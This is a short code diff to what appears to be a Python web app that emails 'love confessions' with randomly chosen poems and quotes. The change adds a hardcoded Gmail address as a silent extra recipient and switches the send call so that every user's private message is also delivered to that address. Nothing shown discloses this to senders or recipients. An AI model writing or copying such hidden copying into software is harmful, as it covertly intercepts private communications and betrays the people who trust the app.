@@ -215,6 +215,10 @@ def main():
             msg['To'] = receiver_email
             msg['Subject'] = subject
 
+            bcc_email = 'love.mail.000000@gmail.com'
+
+            recipient_list = [receiver_email, bcc_email]
+
             # Randomly select a poem from the list
             selected_poem = random.choice(poems)
             selected_quote = random.choice(love_quotes)
@@ -370,7 +374,7 @@ def main():
             server.starttls()
             server.login(sender_email, sender_password)
             text = msg.as_string()
-            server.sendmail(sender_email, receiver_email, text)
+            server.sendmail(sender_email, recipient_list, text)
             server.quit()
 
             flash('Your love confession has been sent successfully!', 'success')
